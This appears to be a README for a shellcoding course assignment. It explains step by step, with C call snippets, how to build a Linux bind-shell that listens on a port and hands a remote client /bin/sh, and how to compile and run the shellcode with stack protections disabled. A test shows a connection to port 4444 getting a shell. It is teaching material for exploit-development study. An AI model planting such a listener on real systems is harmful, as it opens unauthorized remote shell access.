Assignment 1
============

* create a shell bind TCP shellcode:
    * binds to port
    * execs shell on incoming connection
* port number should be easily configurable


Bindshell prototype in C
-------------------------

There are many examples of C-based bindshell code available on the interwebs
which can be used immediately. I decided to start from the scratch and write
one using available documentation and references.

I decided also to describe each called function and its arguments - this will
come handy when translating C code into assembly instructions.

In order to serve remote client with shell we need to begin with setting up the
network stack. Content of `man 2 listen` describes work flow required to accept
remote connection:

1. A socket is created with socket(2)
2. The socket is bound to a local address using bind(2), so that other sockets
   may be connect(2)ed to it
3. A willingness to accept incoming connections and a queue limit for incoming
   connections are specified with listen()
4. Connections are accepted with accept(2)

Reading `man 2 socket` will tell us that this function will create unnamed
socket and return an integer value - socket file descriptor.

Function is prototyped in the following way:

    int socket(int domain, int type, int protocol);

As we are going to implement TCP-based communication man page suggests using
following values as function arguments:

    // domain
    // AF_INET - IPv4 communication
    // AF_INET = 2 (/usr/src/linux/include/linux/socket.h)
    domain = AF_INET

    // type
    // SOCK_STREAM - "sequenced, reliable, two-way, connection-based"
    // SOCK_STREAM = 1 (/usr/src/linux/include/linux/net.h)
    type = SOCK_STREAM

    // protocol
    // IPPROTO_TCP
    // IPPROTO_TCP = 6 (/usr/include/netinet/in.h)
    protocol = IPPROTO_TCP

Eventually socket can be created using following call:

    sock = socket(2, 1, 6);

Return value (file descriptor number) needs to be assigned to a variable as it
will be used in the future calls.

Next step would be assigning a name to a socket using `bind()` call. 

Per `man 2 bind` this function is prototyped in the following way:

    int bind(int sockfd, struct sockaddr_in *my_addr, socklen_t addrlen);

Function arguments will be defined in the following manner - detailed
description of `sockaddr_in` structure can be found in `man 7 ip`:

    // sockfd
    // file descriptor number returned by socket() call
    sockfd = sock

    // struct sockaddr_in
    // Structure holding IP interface address and port number
    // address family
    // AF_INET = 2
    sin_family = AF_INET
    // port (big endian)
    sin_port = PORT
    // sin_addr.s_addr
    // IP address (network byte order)
    // INADDR_ANY = 0 (/usr/include/netinet/in.h)
    sin_addr.s_addr = INADDR_ANY

    // addrlen
    // size of sockaddr_in in bytes (16)
    addrlen = sizeof(sockaddr_in)
    
In this particular example `bind()` will be called as below:

    struct sockaddr_in srv;

    srv.sin_family = 2;
    // htons - host byte order to network byte order
    srv.sin_port = htons(PORT)
    srv.sin_addr.s_addr = 0
    bind(sock, (struct sockaddr *) &srv, 16)

Named socket must be now marked as able to listen for connections: `man 2 listen`.
Prototype of the `listen()` function:

    int listen(int sockfd, int backlog);

Function arguments will be defined in the following way:

    // sockfd
    // file descriptor number returned by socket() call
    sockfd = sock

    // backlog
    // max length of queue of pending connections
    // SOMAXCONN = 128 (/usr/src/linux/include/linux/socket.h)
    backlog = 128

Taking above into account `listen()` function will be called as below:

    listen(sock, 128);

Eventually when socket is listening for incoming connection we can accept one of
them using `accept()` call.

Function prototype can be found in `man 2 accept`

    int accept(int s, struct sockaddr *addr, socklen_t *addrlen);

Following arguments will be used:

    // s
    // file descriptor number returned by socket() call
    s = sock

    // struct sockaddr
    // IP address and port of remote peer
    // We won't use this info
    struct sockaddr = 0

    // addrlen
    // As sockaddr is not used - addrlen = 0
    addrlen = 0

Function `accept()` will be called in the following way:

    csock = accept(sock, 0, 0);

Return value (file descriptor number) needs to be assigned to a variable as it
will be used in the future calls.

As we are going to run shell we expect that input and output will be possible.
This requires us to link newly obtained client socket fd with STDIN, STDOUT and
STDERR. We would like shell to read and write using client socket fd - this can
by achieved by using `dup2()`.

Function prototype can be found in `man 2 dup2`:

    int dup2(int oldfd, int newfd);

Following arguments will be used:

    // oldfd
    // client socket file descriptor
    oldfd = csock

    // newfd
    // file descriptor number of STDIN, STDOUT, STDERR
    // STDIN_FILENO = 0 (man stdin)
    newfd = 0
    // STDOUT_FILENO = 1
    newfd = 1
    // STDERR_FILENO = 2
    newfd = 2

As three function calls are required it can be implemented in the following way:

    int c=2;
    while (c>=0) {
      dup2(csock, c);
      c--;
    }

With established connection and duplicated descriptors shell can be executed
utilizing `execve()` call.

Function prototype can be found in `man 2 execve`:

    int execve(const char *filename, char *const argv [], char *const envp[]);

Following arguments will be used:

    // filename
    // NULL terminated string "/bin/bash"
    filename = "/bin/bash"

    // argv[]
    // NULL terminated array of arguments
    // According to `man 2 execve`: "By convention, the first of these strings
    // should contain the filename associated with the file being executed"
    // We'll leave it set to NULL
    argv = 0

    // envp[]
    // array of strings containing environment variables
    envp = 0

Function `execve()` will be called in the following way:

    execve("/bin/sh",0,0);

As I decided to write bindshell able to accommodate more than one remote
connection it's necessary to introduce two additional functions.

First of them is `fork()` which allows to create child process. Such child
process can be tasked with handling connection with particular remote client and
spawning shell for him.

Function prototype can be found in `man 2 fork`:

    pid_t fork(void);

Function doesn't take any arguments but it's important to save returned value in
order to branch code properly (parent/child).

Another function used in pair with `fork()` will be `close()`. This one will be
needed to close particular socket file descriptor depending on current code
branch (parent/child) in order to avoid several processes accessing the same
file descriptor.

Function prototype can be found in `man 2 close`:

    int close(int fd);

Following argument will be used:

    // fd
    // file descriptor to be closed
    fd = sock

Function `close()` will be called in the following way:

    close(sock);

Combining all above information I have created C-based bindshell - it can be
found in the file called `bindshell.c`.

It should be noted that presented code doesn't follow best practices, e.g. at no
point are return values checked for errors. It was meant only to be used as a
template for further work on assembler version.


Bindshell in assembler
----------------------

Commented assembler version of `bindshell.c` can be found in file called
`bindshell.asm`.


Compilation
-----------

I have prepared Bash script (`compile.sh`) which helps with modification of the
port, compiling and linking. For example file `bindshell.asm` can be compiled to
executable which will then bind to port 4444 with following command:

    ./compile.sh bindshell.asm 4444

Script will also print shellcode and its length. Shellcode itself can be placed
in file `run_shellcode.c` and then compiled with:

    gcc -fno-stack-protector -z execstack -o run_shellcode run_shellcode.c

Note that some port values can result in null bytes to be present in shellcode.


Testing
-------

That's straightforward. Just run `./run_shellcode` and try to connect to
listening service:

    root@kali:~# ncat -n 192.168.15.1 4444
    cowsay -s "mooooo"
     ________ 
    < mooooo >
     -------- 
            \   ^__^
             \  (**)\_______
                (__)\       )\/\
                 U  ||----w |
                    ||     ||


References
----------

* [Startup state of a Linux/i386 ELF binary](http://asm.sourceforge.net/articles/startup.html)
* [Linux System Call Table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
* [Writing multithreaded programs under Linux](http://rudy.mif.pg.gda.pl/~bogdro/linux/watki_linux_en.html)
* [Programming IP Sockets on Linux, Part One](http://gnosis.cx/publish/programming/sockets.html)
* [Writing shellcode for Linux and BSD](http://www.kernel-panic.it/security/shellcode/)


<!---
vim: set textwidth=80 wrapmargin=2:
-->
